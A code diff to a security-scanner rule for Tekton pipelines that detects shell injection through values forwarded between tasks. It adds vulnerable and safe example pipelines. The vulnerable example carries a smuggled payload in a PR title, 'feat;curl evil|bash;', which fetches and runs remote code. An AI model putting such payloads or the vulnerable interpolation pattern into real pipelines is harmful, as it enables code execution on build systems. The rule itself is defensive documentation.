@@ -58,10 +58,10 @@ RULE = Rule(
     esf=("ESF-D-INJECTION",),
     cwe=("CWE-78", "CWE-829"),
     recommendation=(
-        "Sanitise the value at the producer task before it "
+        "Sanitize the value at the producer task before it "
         "lands in ``$(results.<name>.path)``. The canonical "
         "safe pattern is to copy the ``$(params.<name>)`` source "
-        "into an intermediate shell variable, run a sanitiser "
+        "into an intermediate shell variable, run a sanitizer "
         "(``tr -dc 'a-zA-Z0-9 '`` for a freeform title), and "
         "only then write the cleaned value to the result file. "
         "The consumer task should still treat its own param as "
@@ -70,7 +70,7 @@ RULE = Rule(
         "interpolating elsewhere. Removing the cross-task "
         "results forwarding is the strongest fix; if the value "
         "genuinely needs to flow downstream, validate the "
-        "sanitiser is doing what you think before relying on "
+        "sanitizer is doing what you think before relying on "
         "it."
     ),
     docs_note=(
@@ -98,13 +98,70 @@ RULE = Rule(
         "yet."
     ),
     known_fp=(
-        "If the producer task runs a sanitiser between the "
+        "If the producer task runs a sanitizer between the "
         "tainted ``$(params.X)`` interpolation and the "
         "``$(results.Y.path)`` write, the consumer is no longer "
         "exploitable but TAINT-006 still fires. Suppress via "
         "ignore-file scoped to the consumer task name when "
-        "this is the deliberate shape; the sanitiser is then "
+        "this is the deliberate shape; the sanitizer is then "
         "load-bearing.",
+    ),
+    exploit_example=(
+        "# Vulnerable: Task ``extract`` writes the PR title to a\n"
+        "# Tekton ``result``; Task ``use`` reads it back and\n"
+        "# inlines it into a shell command. A PipelineRun whose\n"
+        "# upstream provides ``feat;curl evil|bash;`` for the\n"
+        "# title lands the metacharacters in ``use``'s shell.\n"
+        "apiVersion: tekton.dev/v1\n"
+        "kind: Pipeline\n"
+        "spec:\n"
+        "  params:\n"
+        "    - name: pr-title\n"
+        "  tasks:\n"
+        "    - name: extract\n"
+        "      taskSpec:\n"
+        "        params: [{ name: title }]\n"
+        "        results: [{ name: clean-title }]\n"
+        "        steps:\n"
+        "          - name: extract\n"
+        "            image: alpine@sha256:abc123...\n"
+        "            script: |\n"
+        "              echo -n \"$(params.title)\" > $(results.clean-title.path)\n"
+        "      params:\n"
+        "        - { name: title, value: $(params.pr-title) }\n"
+        "    - name: use\n"
+        "      runAfter: [extract]\n"
+        "      taskSpec:\n"
+        "        params: [{ name: title }]\n"
+        "        steps:\n"
+        "          - name: use\n"
+        "            image: alpine@sha256:abc123...\n"
+        "            script: |\n"
+        "              ./gen-notes --title $(params.title)\n"
+        "      params:\n"
+        "        - { name: title, value: $(tasks.extract.results.clean-title) }\n"
+        "\n"
+        "# Safe: sanitize at the producer Task (strip metacharacters\n"
+        "# to an expected charset) before writing the result, and\n"
+        "# bind the consumer's param to a shell env var that's\n"
+        "# quoted on every use. The injected ``;`` / backticks\n"
+        "# either never reach the result or are quoted away.\n"
+        "apiVersion: tekton.dev/v1\n"
+        "kind: Pipeline\n"
+        "spec:\n"
+        "  tasks:\n"
+        "    - name: extract\n"
+        "      taskSpec:\n"
+        "        params: [{ name: title }]\n"
+        "        results: [{ name: clean-title }]\n"
+        "        steps:\n"
+        "          - name: extract\n"
+        "            image: alpine@sha256:abc123...\n"
+        "            env:\n"
+        "              - { name: RAW, value: $(params.title) }\n"
+        "            script: |\n"
+        "              echo -n \"$RAW\" | tr -dc 'a-zA-Z0-9 -' \\\n"
+        "                > $(results.clean-title.path)"
     ),
 )
 
@@ -146,4 +203,5 @@ def check(ctx: TektonContext) -> Finding:
         check_id=RULE.id, title=RULE.title, severity=RULE.severity,
         resource="tekton", description=desc,
         recommendation=RULE.recommendation, passed=False,
+        taint_flows=tuple(p.to_flow() for p in all_paths),
     )
